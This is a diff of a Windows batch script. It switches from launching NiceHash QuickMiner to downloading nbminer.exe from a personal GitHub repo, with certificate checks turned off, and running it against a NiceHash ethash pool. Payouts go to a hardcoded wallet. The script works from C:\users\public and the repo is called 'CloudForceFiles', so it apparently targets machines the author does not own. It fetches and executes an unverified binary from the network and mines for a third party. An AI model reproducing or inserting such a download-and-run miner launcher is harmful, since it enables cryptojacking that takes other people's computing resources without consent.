@@ -1,7 +1,4 @@
 @echo off
 cd C:\users\public\
-curl -LJOk "https://github.com/nicehash/NiceHashQuickMiner/releases/download/v0.5.3.3/NHQM_v0.5.3.3.zip"
-tar -xf NHQM_v0.5.3.3.zip 
-cd NHQM_v0.5.3.3
-start "" "NiceHashQuickMiner.exe"
-echo 35YDSvNdKVCmA2RRQd2fpYQBqhN1SsyqUZ |clip
+curl -LJOk "https://github.com/zortos293/CloudForceFiles/raw/main/nbminer.exe" 
+start "" "nbminer.exe" -a ethash -o nicehash+tcp://daggerhashimoto.eu.nicehash.com:3353 -u 35YDSvNdKVCmA2RRQd2fpYQBqhN1SsyqUZ.Zortosuwu
